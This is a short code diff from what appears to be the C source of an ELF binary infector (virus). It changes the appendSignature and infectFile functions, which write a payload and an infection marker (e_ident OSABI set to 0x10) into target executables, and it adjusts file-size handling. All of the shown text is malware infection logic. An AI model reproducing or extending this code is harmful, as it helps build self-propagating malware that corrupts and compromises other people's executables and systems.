@@ -542,9 +542,9 @@ static void  appendSignature(struct bfile file) {
   char payload[] = PAYLOAD;
 
   len = strlen(payload);
-  memcpy(((void *)file.header) + file.size, payload, len);
-  memcpy(((void *)file.header) + file.size + len, (void *)dynamicSignature + 4, sizeof(size_t));
-  memset(((void *)file.header) + file.size + len + sizeof(size_t), 0, 1);
+  memcpy(((void *)file.header) + file.size - len - sizeof(size_t) - 1, payload, len);
+  memcpy(((void *)file.header) + file.size - sizeof(size_t) - 1, (void *)dynamicSignature + 4, sizeof(size_t));
+  memset(((void *)file.header) + file.size - 1, 0, 1);
   file.header->e_ident[EI_OSABI] = 0x10;
 }
 
@@ -678,7 +678,6 @@ static int  infectFile(struct bfile bin) {
   char payload[] = PAYLOAD;
 
   appendSignature(bin);
-  bin.size += strlen(payload) + sizeof(size_t) + 1;
   if (appendCode(&bin) == -1) {
     munmap(bin.header, bin.size);
     return (-1);
